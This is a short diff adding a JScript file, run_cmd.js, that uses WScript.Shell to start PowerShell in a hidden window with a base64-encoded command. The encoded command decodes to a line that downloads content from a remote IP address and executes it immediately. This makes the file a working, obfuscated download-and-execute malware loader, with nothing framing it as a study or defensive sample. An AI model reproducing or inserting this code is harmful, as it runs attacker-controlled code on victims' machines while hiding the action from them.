@@ -1,0 +1,3 @@
+// run_cmd.js
+var shell = new ActiveXObject("WScript.Shell");
+shell.Run('powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand "aQB3AHIAIAAiADQANQAuADEANAAxAC4AMgAzADMALgA5ADAAIgAgAHwAIABpAGUAeAA="');
